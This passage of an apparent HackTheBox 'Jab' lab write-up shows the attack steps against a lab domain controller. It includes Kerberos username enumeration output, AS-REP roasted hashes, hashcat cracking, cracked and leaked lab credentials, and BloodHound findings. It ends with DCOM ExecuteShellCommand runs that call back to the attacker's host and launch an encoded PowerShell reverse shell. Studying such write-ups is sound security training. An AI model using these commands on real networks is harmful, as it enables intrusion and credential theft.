+2024/03/07 14:03:16 &gt;  [+] VALID USERNAME:       mpatrick@jab.htb
+2024/03/07 14:03:19 &gt;  [+] VALID USERNAME:       mnixon@jab.htb
+2024/03/07 14:03:19 &gt;  [+] VALID USERNAME:       mmauldin@jab.htb
+2024/03/07 14:03:20 &gt;  [+] VALID USERNAME:       mmartinez@jab.htb
+2024/03/07 14:03:20 &gt;  [+] VALID USERNAME:       mlynch@jab.htb
+2024/03/07 14:03:20 &gt;  [+] VALID USERNAME:       mlyon@jab.htb
+2024/03/07 14:03:20 &gt;  [+] mlowe has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$mlowe@JAB.HTB:7d61c3cdea1a8068a37ca04b9960f62e$c2023f6ded62184c89bc63ccb2b0f5e4289795aec269b965e0b39d6a515aa0295332f160cbfec340a9545aee141e829f0ebc25a35d144d490554d63386c58ff2a78a860fe6c8a63c33c2cb97470e3790862c6128937473c92a681f86aae2fe111a30b54456d404c5fa0944b22ef92aab087f9c8149ca7a58edd68fb6d1db360b01b6ff3e1d7526e42067c5dd54b925eb0bf912865a9b84adf5f752c8d0cc2b6b387c247a5e1cb61d368579372a89c6b2a31a28fd546b7fea17879ff2ff5b2e771a67ff0e71e8bfe74c667fe04177617750637f11cbc7807dacefccb255641d36eb06cd8dbe7bc97afcc8cfb3c2fbea880ae18e67f120
+2024/03/07 14:03:20 &gt;  [+] VALID USERNAME:       mlowe@jab.htb
+2024/03/07 14:03:20 &gt;  [+] VALID USERNAME:       mleal@jab.htb
+2024/03/07 14:03:20 &gt;  [+] VALID USERNAME:       mjenkins@jab.htb
+2024/03/07 14:03:24 &gt;  [+] VALID USERNAME:       mhubbard@jab.htb
+2024/03/07 14:03:24 &gt;  [+] VALID USERNAME:       mhanna@jab.htb
+2024/03/07 14:03:24 &gt;  [+] VALID USERNAME:       mgill@jab.htb
+2024/03/07 14:03:24 &gt;  [+] VALID USERNAME:       mgarza@jab.htb
+2024/03/07 14:03:24 &gt;  [+] VALID USERNAME:       mfields@jab.htb
+2024/03/07 14:03:24 &gt;  [+] VALID USERNAME:       mestrada@jab.htb
+2024/03/07 14:03:27 &gt;  [+] VALID USERNAME:       mboyd@jab.htb
+2024/03/07 14:03:27 &gt;  [+] VALID USERNAME:       mbarton@jab.htb
+2024/03/07 14:03:27 &gt;  [+] VALID USERNAME:       mbaldwin@jab.htb
+2024/03/07 14:03:31 &gt;  [+] VALID USERNAME:       marmstrong@jab.htb
+2024/03/07 14:03:39 &gt;  [+] VALID USERNAME:       lray@jab.htb
+2024/03/07 14:03:44 &gt;  [+] VALID USERNAME:       lgarcia@jab.htb
+2024/03/07 14:03:45 &gt;  [+] VALID USERNAME:       lelliott@jab.htb
+2024/03/07 14:03:46 &gt;  [+] VALID USERNAME:       lcoleman@jab.htb
+2024/03/07 14:03:46 &gt;  [+] VALID USERNAME:       lbryant@jab.htb
+2024/03/07 14:03:46 &gt;  [+] VALID USERNAME:       lbell@jab.htb
+2024/03/07 14:03:50 &gt;  [+] VALID USERNAME:       kturner@jab.htb
+2024/03/07 14:03:50 &gt;  [+] VALID USERNAME:       ktorres@jab.htb
+2024/03/07 14:03:50 &gt;  [+] VALID USERNAME:       kspencer@jab.htb
+2024/03/07 14:03:53 &gt;  [+] VALID USERNAME:       kmccoy@jab.htb
+2024/03/07 14:03:54 &gt;  [+] VALID USERNAME:       klaing@jab.htb
+2024/03/07 14:03:54 &gt;  [+] VALID USERNAME:       kkennedy@jab.htb
+2024/03/07 14:03:56 &gt;  [+] VALID USERNAME:       khiggins@jab.htb
+2024/03/07 14:03:56 &gt;  [+] VALID USERNAME:       khenry@jab.htb
+2024/03/07 14:03:56 &gt;  [+] VALID USERNAME:       kfoster@jab.htb
+2024/03/07 14:03:58 &gt;  [+] VALID USERNAME:       kdennis@jab.htb
+2024/03/07 14:03:59 &gt;  [+] VALID USERNAME:       kbedford@jab.htb
+2024/03/07 14:03:59 &gt;  [+] VALID USERNAME:       kbateman@jab.htb
+2024/03/07 14:03:59 &gt;  [+] VALID USERNAME:       kbarrett@jab.htb
+2024/03/07 14:04:02 &gt;  [+] VALID USERNAME:       jvargas@jab.htb
+2024/03/07 14:04:03 &gt;  [+] VALID USERNAME:       julrich@jab.htb
+2024/03/07 14:04:03 &gt;  [+] VALID USERNAME:       jtate@jab.htb
+2024/03/07 14:04:04 &gt;  [+] VALID USERNAME:       jshelton@jab.htb
+2024/03/07 14:04:04 &gt;  [+] VALID USERNAME:       jschneider@jab.htb
+2024/03/07 14:04:05 &gt;  [+] VALID USERNAME:       jramsey@jab.htb
+2024/03/07 14:04:05 &gt;  [+] VALID USERNAME:       jplace@jab.htb
+2024/03/07 14:04:05 &gt;  [+] VALID USERNAME:       jpeterson@jab.htb
+2024/03/07 14:04:05 &gt;  [+] VALID USERNAME:       jperkins@jab.htb
+2024/03/07 14:04:05 &gt;  [+] VALID USERNAME:       jpearson@jab.htb
+2024/03/07 14:04:05 &gt;  [+] VALID USERNAME:       jpatterson@jab.htb
+2024/03/07 14:04:05 &gt;  [+] VALID USERNAME:       jpace@jab.htb
+2024/03/07 14:04:10 &gt;  [+] VALID USERNAME:       jmunson@jab.htb
+2024/03/07 14:04:10 &gt;  [+] VALID USERNAME:       jmunoz@jab.htb
+2024/03/07 14:04:10 &gt;  [+] VALID USERNAME:       jmcneal@jab.htb
+2024/03/07 14:04:10 &gt;  [+] VALID USERNAME:       jlynn@jab.htb
+2024/03/07 14:04:13 &gt;  [+] VALID USERNAME:       jhay@jab.htb
+2024/03/07 14:04:13 &gt;  [+] VALID USERNAME:       jhardy@jab.htb
+2024/03/07 14:04:13 &gt;  [+] VALID USERNAME:       jharding@jab.htb
+2024/03/07 14:04:13 &gt;  [+] VALID USERNAME:       jgutierrez@jab.htb
+2024/03/07 14:04:13 &gt;  [+] VALID USERNAME:       jgould@jab.htb
+2024/03/07 14:04:16 &gt;  [+] VALID USERNAME:       jearl@jab.htb
+2024/03/07 14:04:16 &gt;  [+] VALID USERNAME:       jdavidson@jab.htb
+2024/03/07 14:04:16 &gt;  [+] VALID USERNAME:       jcraft@jab.htb
+2024/03/07 14:04:17 &gt;  [+] VALID USERNAME:       jbolton@jab.htb
+2024/03/07 14:04:17 &gt;  [+] VALID USERNAME:       jbest@jab.htb
+2024/03/07 14:04:19 &gt;  [+] VALID USERNAME:       jandrade@jab.htb
+2024/03/07 14:04:30 &gt;  [+] VALID USERNAME:       hmorris@jab.htb
+2024/03/07 14:04:32 &gt;  [+] VALID USERNAME:       hholmes@jab.htb
+2024/03/07 14:04:38 &gt;  [+] VALID USERNAME:       gwright@jab.htb
+2024/03/07 14:04:44 &gt;  [+] VALID USERNAME:       gmartinez@jab.htb
+2024/03/07 14:04:44 &gt;  [+] VALID USERNAME:       glittle@jab.htb
+2024/03/07 14:04:45 &gt;  [+] VALID USERNAME:       gjimenez@jab.htb
+2024/03/07 14:04:46 &gt;  [+] VALID USERNAME:       ghansen@jab.htb
+2024/03/07 14:04:46 &gt;  [+] VALID USERNAME:       ggarner@jab.htb
+2024/03/07 14:04:51 &gt;  [+] VALID USERNAME:       fwood@jab.htb
+2024/03/07 14:04:56 &gt;  [+] VALID USERNAME:       fmartin@jab.htb
+2024/03/07 14:04:57 &gt;  [+] VALID USERNAME:       flewis@jab.htb
+2024/03/07 14:04:58 &gt;  [+] VALID USERNAME:       fflores@jab.htb
+2024/03/07 14:05:03 &gt;  [+] VALID USERNAME:       ewalker@jab.htb
+2024/03/07 14:05:05 &gt;  [+] VALID USERNAME:       erodriguez@jab.htb
+2024/03/07 14:05:05 &gt;  [+] VALID USERNAME:       eroberts@jab.htb
+2024/03/07 14:05:08 &gt;  [+] VALID USERNAME:       elane@jab.htb
+2024/03/07 14:05:08 &gt;  [+] VALID USERNAME:       ejohnson@jab.htb
+2024/03/07 14:05:11 &gt;  [+] VALID USERNAME:       eames@jab.htb
+2024/03/07 14:05:11 &gt;  [+] VALID USERNAME:       dwilliams@jab.htb
+2024/03/07 14:05:11 &gt;  [+] VALID USERNAME:       dwillis@jab.htb
+2024/03/07 14:05:12 &gt;  [+] VALID USERNAME:       dweldon@jab.htb
+2024/03/07 14:05:13 &gt;  [+] VALID USERNAME:       dschmidt@jab.htb
+2024/03/07 14:05:18 &gt;  [+] VALID USERNAME:       dmcbride@jab.htb
+2024/03/07 14:05:19 &gt;  [+] VALID USERNAME:       dlarkin@jab.htb
+2024/03/07 14:05:22 &gt;  [+] VALID USERNAME:       dhouston@jab.htb
+2024/03/07 14:05:22 &gt;  [+] VALID USERNAME:       dfuller@jab.htb
+2024/03/07 14:05:25 &gt;  [+] VALID USERNAME:       delliott@jab.htb
+2024/03/07 14:05:26 &gt;  [+] VALID USERNAME:       ddoss@jab.htb
+2024/03/07 14:05:27 &gt;  [+] VALID USERNAME:       dcornett@jab.htb
+2024/03/07 14:05:27 &gt;  [+] VALID USERNAME:       dcline@jab.htb
+2024/03/07 14:05:27 &gt;  [+] VALID USERNAME:       dclayton@jab.htb
+2024/03/07 14:05:27 &gt;  [+] VALID USERNAME:       dbranch@jab.htb
+2024/03/07 14:05:34 &gt;  [+] VALID USERNAME:       cwilliamson@jab.htb
+2024/03/07 14:05:34 &gt;  [+] VALID USERNAME:       cwayne@jab.htb
+2024/03/07 14:05:35 &gt;  [+] VALID USERNAME:       csutton@jab.htb
+2024/03/07 14:05:35 &gt;  [+] VALID USERNAME:       csimmons@jab.htb
+2024/03/07 14:05:36 &gt;  [+] VALID USERNAME:       csaunders@jab.htb
+2024/03/07 14:05:43 &gt;  [+] VALID USERNAME:       clane@jab.htb
+2024/03/07 14:05:46 &gt;  [+] VALID USERNAME:       cheath@jab.htb
+2024/03/07 14:05:48 &gt;  [+] VALID USERNAME:       cduran@jab.htb
+2024/03/07 14:05:49 &gt;  [+] VALID USERNAME:       cchen@jab.htb
+2024/03/07 14:05:49 &gt;  [+] VALID USERNAME:       cbutler@jab.htb
+2024/03/07 14:05:50 &gt;  [+] VALID USERNAME:       catkins@jab.htb
+2024/03/07 14:05:51 &gt;  [+] VALID USERNAME:       carmstrong@jab.htb
+2024/03/07 14:05:54 &gt;  [+] VALID USERNAME:       bwoods@jab.htb
+2024/03/07 14:05:54 &gt;  [+] VALID USERNAME:       bwelch@jab.htb
+2024/03/07 14:05:54 &gt;  [+] VALID USERNAME:       bwalters@jab.htb
+2024/03/07 14:05:57 &gt;  [+] VALID USERNAME:       bstewart@jab.htb
+2024/03/07 14:06:00 &gt;  [+] VALID USERNAME:       bphillips@jab.htb
+2024/03/07 14:06:04 &gt;  [+] VALID USERNAME:       bmoran@jab.htb
+2024/03/07 14:06:11 &gt;  [+] VALID USERNAME:       bhiggins@jab.htb
+2024/03/07 14:06:11 &gt;  [+] VALID USERNAME:       bhammond@jab.htb
+2024/03/07 14:06:12 &gt;  [+] VALID USERNAME:       bgarcia@jab.htb
+2024/03/07 14:06:12 &gt;  [+] VALID USERNAME:       bfunk@jab.htb
+2024/03/07 14:06:12 &gt;  [+] VALID USERNAME:       bford@jab.htb
+2024/03/07 14:06:19 &gt;  [+] VALID USERNAME:       bandrews@jab.htb
+2024/03/07 14:06:19 &gt;  [+] VALID USERNAME:       balexander@jab.htb
+2024/03/07 14:06:22 &gt;  [+] VALID USERNAME:       awalters@jab.htb
+2024/03/07 14:06:23 &gt;  [+] VALID USERNAME:       astewart@jab.htb
+2024/03/07 14:06:25 &gt;  [+] VALID USERNAME:       arowe@jab.htb
+2024/03/07 14:06:25 &gt;  [+] VALID USERNAME:       arobinson@jab.htb
+2024/03/07 14:06:26 &gt;  [+] VALID USERNAME:       arichards@jab.htb
+2024/03/07 14:06:26 &gt;  [+] VALID USERNAME:       arey@jab.htb
+2024/03/07 14:06:31 &gt;  [+] VALID USERNAME:       amorgan@jab.htb
+2024/03/07 14:06:33 &gt;  [+] VALID USERNAME:       alittle@jab.htb
+2024/03/07 14:06:35 &gt;  [+] VALID USERNAME:       ajoseph@jab.htb
+2024/03/07 14:06:35 &gt;  [+] VALID USERNAME:       ajenkins@jab.htb
+2024/03/07 14:06:35 &gt;  [+] VALID USERNAME:       aingram@jab.htb
+2024/03/07 14:06:36 &gt;  [+] VALID USERNAME:       agibbs@jab.htb
+2024/03/07 14:06:38 &gt;  [+] VALID USERNAME:       adelgado@jab.htb
+2024/03/07 14:06:38 &gt;  [+] VALID USERNAME:       acoleman@jab.htb
+2024/03/07 14:06:38 &gt;  [+] VALID USERNAME:       aclark@jab.htb
+2024/03/07 14:06:39 &gt;  [+] VALID USERNAME:       abutler@jab.htb
+2024/03/07 14:06:42 &gt;  [+] VALID USERNAME:       Thodge@jab.htb
+2024/03/07 14:06:43 &gt;  [+] VALID USERNAME:       Tbrown@jab.htb
+2024/03/07 14:06:46 &gt;  [+] VALID USERNAME:       Screech@jab.htb
+2024/03/07 14:06:47 &gt;  [+] VALID USERNAME:       SJohnson@jab.htb
+2024/03/07 14:06:50 &gt;  [+] VALID USERNAME:       RTaylor@jab.htb
+2024/03/07 14:06:50 &gt;  [+] VALID USERNAME:       RMILLER@jab.htb
+2024/03/07 14:06:50 &gt;  [+] VALID USERNAME:       RJONES@jab.htb
+2024/03/07 14:06:52 &gt;  [+] VALID USERNAME:       PSMITH@jab.htb
+2024/03/07 14:06:55 &gt;  [+] VALID USERNAME:       Mpowell@jab.htb
+2024/03/07 14:06:55 &gt;  [+] VALID USERNAME:       Mjones@jab.htb
+2024/03/07 14:06:56 &gt;  [+] VALID USERNAME:       Mgreen@jab.htb
+2024/03/07 14:06:57 &gt;  [+] VALID USERNAME:       MSMITH@jab.htb
+2024/03/07 14:06:59 &gt;  [+] VALID USERNAME:       LHoward@jab.htb
+2024/03/07 14:06:59 &gt;  [+] VALID USERNAME:       Krogers@jab.htb
+2024/03/07 14:07:00 &gt;  [+] VALID USERNAME:       KSMITH@jab.htb
+2024/03/07 14:07:01 &gt;  [+] VALID USERNAME:       Jthomas@jab.htb
+2024/03/07 14:07:01 &gt;  [+] VALID USERNAME:       Jsteele@jab.htb
+2024/03/07 14:07:01 &gt;  [+] VALID USERNAME:       Jsmith@jab.htb
+2024/03/07 14:07:01 &gt;  [+] VALID USERNAME:       Jmorgan@jab.htb
+2024/03/07 14:07:01 &gt;  [+] VALID USERNAME:       Jmiller@jab.htb
+2024/03/07 14:07:02 &gt;  [+] VALID USERNAME:       Jallen@jab.htb
+2024/03/07 14:07:03 &gt;  [+] VALID USERNAME:       JWILLIAM@jab.htb
+2024/03/07 14:07:03 &gt;  [+] VALID USERNAME:       JStevens@jab.htb
+2024/03/07 14:07:03 &gt;  [+] VALID USERNAME:       JJohnson@jab.htb
+2024/03/07 14:07:03 &gt;  [+] VALID USERNAME:       JJONES@jab.htb
+2024/03/07 14:07:03 &gt;  [+] VALID USERNAME:       JBrown@jab.htb
+2024/03/07 14:07:10 &gt;  [+] VALID USERNAME:       Dyoung@jab.htb
+2024/03/07 14:07:11 &gt;  [+] VALID USERNAME:       Dgreen@jab.htb
+2024/03/07 14:07:13 &gt;  [+] VALID USERNAME:       DTaylor@jab.htb
+2024/03/07 14:07:13 &gt;  [+] VALID USERNAME:       DSmith@jab.htb
+2024/03/07 14:07:13 &gt;  [+] VALID USERNAME:       DNelson@jab.htb
+2024/03/07 14:07:13 &gt;  [+] VALID USERNAME:       DJONES@jab.htb
+2024/03/07 14:07:13 &gt;  [+] VALID USERNAME:       DHICKS@jab.htb
+2024/03/07 14:07:13 &gt;  [+] VALID USERNAME:       DHansen@jab.htb
+2024/03/07 14:07:16 &gt;  [+] VALID USERNAME:       CJohnson@jab.htb
+2024/03/07 14:07:21 &gt;  [+] VALID USERNAME:       BJohnson@jab.htb
+2024/03/07 14:07:21 &gt;  [+] VALID USERNAME:       BJones@jab.htb
+2024/03/07 14:07:23 &gt;  [+] VALID USERNAME:       ASMITH@jab.htb
+2024/03/07 14:07:23 &gt;  [+] VALID USERNAME:       AMoore@jab.htb
+2024/03/07 14:07:23 &gt;  [+] VALID USERNAME:       AJohnson@jab.htb
+2024/03/07 14:08:00 &gt;  [+] VALID USERNAME:       wparker@jab.htb
+2024/03/07 14:08:02 &gt;  [+] VALID USERNAME:       wmiles@jab.htb
+2024/03/07 14:08:27 &gt;  [+] VALID USERNAME:       vgonzalez@jab.htb
+2024/03/07 14:08:55 &gt;  [+] VALID USERNAME:       trobinson@jab.htb
+2024/03/07 14:09:16 &gt;  [+] VALID USERNAME:       tlandry@jab.htb
+2024/03/07 14:09:35 &gt;  [+] VALID USERNAME:       therman@jab.htb
+2024/03/07 14:09:40 &gt;  [+] VALID USERNAME:       tgreene@jab.htb
+2024/03/07 14:09:41 &gt;  [+] VALID USERNAME:       tgarcia@jab.htb
+2024/03/07 14:09:41 &gt;  [+] VALID USERNAME:       tgant@jab.htb
+2024/03/07 14:09:50 &gt;  [+] VALID USERNAME:       tcosta@jab.htb
+2024/03/07 14:10:21 &gt;  [+] VALID USERNAME:       stroy@jab.htb
+2024/03/07 14:10:24 &gt;  [+] VALID USERNAME:       stodd@jab.htb
+2024/03/07 14:10:36 &gt;  [+] VALID USERNAME:       sspencer@jab.htb
+2024/03/07 14:10:37 &gt;  [+] VALID USERNAME:       sscherer@jab.htb
+2024/03/07 14:10:38 &gt;  [+] VALID USERNAME:       srowland@jab.htb
+2024/03/07 14:10:38 &gt;  [+] VALID USERNAME:       sroche@jab.htb</code></pre>
+</div>
+</details>
+
+<h2>Initial foothold</h2>
+
+<h3>AS-REP roast: Try1</h3>
+
+<ol><li>Found kerberos hash while running kerbrute<pre><code>2024/03/07 14:03:20 &gt;  [+] mlowe has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$mlowe@JAB.HTB:7d61c3cdea1a8068a37ca04b9960f62e$c2023f6ded62184c89bc63ccb2b0f5e4289795aec269b965e0b39d6a515aa0295332f160cbfec340a9545aee141e829f0ebc25a35d144d490554d63386c58ff2a78a860fe6c8a63c33c2cb97470e3790862c6128937473c92a681f86aae2fe111a30b54456d404c5fa0944b22ef92aab087f9c8149ca7a58edd68fb6d1db360b01b6ff3e1d7526e42067c5dd54b925eb0bf912865a9b84adf5f752c8d0cc2b6b387c247a5e1cb61d368579372a89c6b2a31a28fd546b7fea17879ff2ff5b2e771a67ff0e71e8bfe74c667fe04177617750637f11cbc7807dacefccb255641d36eb06cd8dbe7bc97afcc8cfb3c2fbea880ae18e67f120 </code></pre></li>
+<li>hashcat<pre><code>hashcat -m 18200 '$krb5asrep$18$mlowe@JAB.HTB:7d61c3cdea1a8068a37ca04b9960f62e$c2023f6ded62184c89bc63ccb2b0f5e4289795aec269b965e0b39d6a515aa0295332f160cbfec340a9545aee141e829f0ebc25a35d144d490554d63386c58ff2a78a860fe6c8a63c33c2cb97470e3790862c6128937473c92a681f86aae2fe111a30b54456d404c5fa0944b22ef92aab087f9c8149ca7a58edd68fb6d1db360b01b6ff3e1d7526e42067c5dd54b925eb0bf912865a9b84adf5f752c8d0cc2b6b387c247a5e1cb61d368579372a89c6b2a31a28fd546b7fea17879ff2ff5b2e771a67ff0e71e8bfe74c667fe04177617750637f11cbc7807dacefccb255641d36eb06cd8dbe7bc97afcc8cfb3c2fbea880ae18e67f120' /usr/share/wordlists/rockyou.txt </code></pre><p>→ Not cracked</p></li></ol>
+
+<h3>XMPP Jabber: Pt1</h3>
+
+<ol><li>Download pidgin</li>
+<li>Enter domain, ip and click checkbox ‘register new user’</li>
+<li>Buddies &gt; join a chat &gt; room list</li>
+<li>We can anonymously login in one of the chatrooms.</li>
+<li>We can enumerate all users<figure><img src="../assets/images/htb/jab/01-untitled.png" alt=""></figure></li><li>run again using <code>sudo pidgin -d &gt; output.log</code> to extract usernames</li><li><code>grep -oP '&lt;value&gt;\K[^&lt;]+@jab.htb(?=&lt;/value&gt;)' output.log | sed 's/@jab.htb//g' | sort | uniq &gt; output_filtered.lst</code></li></ol>
+
+<h3>AS-Rep Roast: Try2</h3>
+
+<ol><li>Run kerbrute again<pre><code>impacket-GetNPUsers jab.htb/ -usersfile output_filtered.lst -outputfile outputusers.txt -dc-ip 10.10.11.4 -no-pass </code></pre></li>
+<li>Found some more hashes<pre><code>$krb5asrep$23$jmontgomery@JAB.HTB:1badb1a5cad06dc7e04a93fc6e6b8f8e$8cb67428bd2a5d07a6585b1ce81db9187ed2eef5284e1104971d6740bbabf4718c93e24251d0ba88a1ffddaf4837287d41c80974e26f893000579c6162305c68f5dd74c8b93d6d53746bc2c4fc04c8698d67808b5e408595c183bda0296dea00585879d08537372eb393de87913879340c660830f50f35071cc8379cababca396d5f68416b96749f1453ec0f4dbbbb4401a98138818c5d35978f602c11798852f7e1bb36f91f6807a65a42e257612e4fda28f3f0918fff321f83e8f604e6de281eab63e73fba0f9e785d0be6b3edbb3ebfe662895f3b04fad09e14e9f4875aaf3d21
+$krb5asrep$23$lbradford@JAB.HTB:5e544d88bccaeae7615ec42346ab5517$a8242711b5795095f444b6c76bfd302f7f5d38a61074e9564b24138e4d7228204cf2d6ae4324feaf4a137ac093e3f6b8e4650b63c2c58bcd1e7fd4b53d1aa48659742b4bfe626c1eb96ae2fa7f023e97e9f2f782b4d854277fe46d8d13d9822e00d3109b3a2a5de4e7259b062da502e9bac69365d1cce19b4997ecea2d110ddcfe44e35cd443ec47912266dd0b908192426df329e8e843b832bf97dedea85dad446207f6188e286afe4a9db57c9a5c60ef22d8510fb4c31677bd6a4473472871e61dd1062d69b8fa68c323d25abcb5dd22fbdeb823b2dfda247309fbdd910dd6d13e
+$krb5asrep$23$mlowe@JAB.HTB:e34fbd481c8840785474a4c8b20b6d35$f56fa0ca56b2be769eb0723dcd3e347b0fb1dc26dfcbba6f33bdfa643f226eef09fa0348a44da6a8959c01c87dcc8081f5bbee3a80bd5ab8f180f49932db7bf8d33a3e44be8ca8c35eae1c2397b3e03153256ebe1ff5dbd7aff131513434c9bf0f6385d9407633182c54e46e6186b48a782b049bbec592ac96d2e5fe23e8248026d3de1540917a2a1d3977eecf9d2373dba039c3aafd8072ae09513cabb8b1774ed574cd1b1ccf9effdc51869f4e41b13250dbc614682b0b70ddb3c1769c3ef3f411e88bbcd6205fbb7782bb06e33fd3bba968c6ba9e498fc623eca391058ab5aff0</code></pre></li>
+<li>hashcat<pre><code>jmontgomery@JAB.HTB:Midnight_121</code></pre></li></ol>
+
+<h3>XMPP Jabber: Pt2</h3>
+
+<ol><li>Login with those credentials using Pidgin</li>
+<li>A new room is available<figure><img src="../assets/images/htb/jab/02-untitled-1.png" alt=""></figure></li><li>It contains some creds</li><li><mark class="highlight-red" data-notion-highlight="red"><strong>svc_openfire:!@#$%^&amp;*(1qazxsw</strong></mark><ol><li><a href="http://getuserspns.py/">GetUserSPNs.py</a> -request -dc-ip 192.168.195.129 jab.htb/hthompson</li></ol></li><li>Using crackmapexec I was able to verify that the user credentials are correct</li></ol>
+
+<h3>Bloodhound (attack path)</h3>
+
+<ol><li>Run bloodhound:<pre><code>bloodhound-python -u svc_openfire -p '!@#$%^&amp;*(1qazxsw' -gc dc01.jab.htb -ns 10.10.11.4 -d jab.htb -c All</code></pre></li>
+<li>svc_openfire has <code>ExecuteDCOM</code> <ol><li>SVC_OPENFIRE@JAB.HTB has membership in the Distributed COM Users local group on the computer</li>
+<li>This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.</li></ol><figure><img src="../assets/images/htb/jab/03-untitled-2.png" alt=""></figure></li></ol>
+
+<h3>Manipulate COM object RCE</h3>
+
+<figure><p><a href="https://book.hacktricks.xyz/v/fr/windows-hardening/lateral-movement/dcom-exec" target="_blank" rel="noopener noreferrer">DCOM Exec</a></p></figure>
+
+<figure><p><a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" target="_blank" rel="noopener noreferrer">View ExecuteShellCommand method</a> - The ExecuteShellCommand method runs a command in a window. After this method successfully starts the command in a separate process, it returns immediately (it does not wait for the command to complete).</p></figure>
+
+<figure><p><a href="https://github.com/Telefonica/ibombshell/blob/master/data/functions/lateral_movement/mmc20-executeshellcommand" target="_blank" rel="noopener noreferrer">mmc20-executeshellcommand · Telefonica/ibombshell</a></p></figure>
+
+<ol><li>Using a windows VM<pre><code>runas /user:jab.htb\svc_openfire /netonly powershell</code></pre></li>
+<li>New window pops-up<pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.11.4"))
+$com | Get-Member
+$com.Document | get-Member
+$com.Document.ActiveView | get-Member</code></pre></li>
+<li>Found interesting method<pre><code>ExecuteShellCommand  Method  void ExecuteShellCommand (string, string, string, string)</code></pre></li>
+<li>Execute curl to test command execution<pre><code>$com.Document.ActiveView.ExecuteShellCommand("powershell", $null , "-C curl http://10.10.14.3:88", "7")</code></pre></li>
+<li>We can see the requests<pre><code>PS C:\Users\fredericgoossens\Desktop&gt; python3.12.exe -m http.server 88
+Serving HTTP on :: port 88 (http://[::]:88/) ...
+::ffff:10.10.11.4 - [08/Mar/2024 13:46:25] "GET / HTTP/1.1" 200 -
+::ffff:10.10.11.4 - [08/Mar/2024 13:46:35] "GET / HTTP/1.1" 200 -</code></pre></li>
+<li>Get shell<figure><p><a href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer">Online - Reverse Shell Generator</a> - Online Reverse Shell generator with Local Storage functionality, URI &amp; Base64 Encoding, MSFVenom Generator, and Raw Mode. Great for CTFs.</p></figure><pre><code>PS C:\Windows\system32&gt; $com.Document.ActiveView.ExecuteShellCommand("powershell", $null , "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=", "7")
+
+# or on linux (note, different IP)
+
+python3 dcomexec.py 'jab.htb/svc_openfire:!@#$%^&amp;*(1qazxsw@dc01.jab.htb' 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAI